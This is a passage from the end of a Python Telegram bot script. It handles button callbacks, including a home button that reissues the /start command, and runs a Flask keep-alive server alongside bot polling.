        bot.send_message(chat_id, f"\U0001f4bb \\u0642\\u0646\\u0627\\u0629 \\u0627\\u0644\\u0645\\u0637\\u0648\\u0651\\u0631:\\n👉 {CHANNEL_URL}")

    elif data == "back_home":
        bot.answer_callback_query(call.id)
        fake_msg = types.Message(
            message_id=call.message.message_id, from_user=call.from_user,
            chat=call.message.chat, date=call.message.date, content_type='text',
            options={}, json_string=''
        )
        fake_msg.text = '/start'
        send_welcome(fake_msg)

    else:
        bot.answer_callback_query(call.id, "\\u062a\\u0645 \\u0627\\u0644\\u062a\\u0646\\u0641\\u064a\\u0630")

def run_flask():
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))

if __name__ == "__main__":
    print("Full Bot is running with all buttons in Unicode...")
    threading.Thread(target=run_flask, daemon=True).start()
    bot.infinity_polling()
